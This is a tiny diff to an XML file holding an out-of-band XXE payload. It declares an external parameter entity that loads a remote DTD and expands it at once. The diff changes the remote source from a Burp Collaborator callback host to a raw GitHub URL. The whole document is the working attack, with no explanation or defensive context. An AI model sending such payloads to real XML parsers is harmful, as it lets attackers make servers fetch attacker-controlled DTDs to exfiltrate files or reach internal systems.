@@ -1,6 +1,6 @@
 <?xml version="1.0" ?>
 <!DOCTYPE message [
-    <!ENTITY % ext SYSTEM "http://4nsq4tu3xyakkp8expepcac18seo2d.burpcollaborator.net/ext.dtd">
+    <!ENTITY % ext SYSTEM "https://raw.githubusercontent.com/StevenHarlandQC/StevenHarlandQC.github.io/main/ext.dtd">
     %ext;
 ]>
 <message></message>
